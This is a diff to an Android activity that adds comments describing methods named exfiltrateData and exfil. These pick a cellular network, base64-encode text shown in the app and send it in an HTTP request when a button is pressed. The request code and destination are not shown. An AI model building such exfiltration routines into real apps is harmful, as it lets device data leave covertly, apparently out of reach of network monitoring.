@@ -88,8 +88,10 @@ public class DisplayOutput extends AppCompatActivity {
             return false;
         }
     }
-    /*
 
+
+    /*
+        returns the last network with cellular data enabled, or null otherwise
      */
     private Network getCellularNetwork(){
         Network n = null;
@@ -111,6 +113,11 @@ public class DisplayOutput extends AppCompatActivity {
         return n;
     }
 
+
+    /*
+        attempts to exfiltrate data over cellular network
+        base64 encodes data string then makes HTTP request
+     */
     public void exfiltrateData(String uuid, String data){
         Network n = getCellularNetwork();
         if(n == null)
@@ -128,12 +135,16 @@ public class DisplayOutput extends AppCompatActivity {
     }
 
 
+    /*
+        Handles button press for exfiltrating data
+        Gets UUID and Output from textviews
+        New thread must be created because android doesn't like networking/GUI on same thread
+     */
     public void exfil(View v){
         TextView uuidDisplay = (TextView) findViewById(R.id.uuidDisplay);
         TextView outputTextView = (TextView) findViewById(R.id.outputTextView);
         String uuid = uuidDisplay.getText().toString();
         String outputText = outputTextView.getText().toString();
-
         Thread thread = new Thread(new Runnable() {
             @Override
             public void run() {
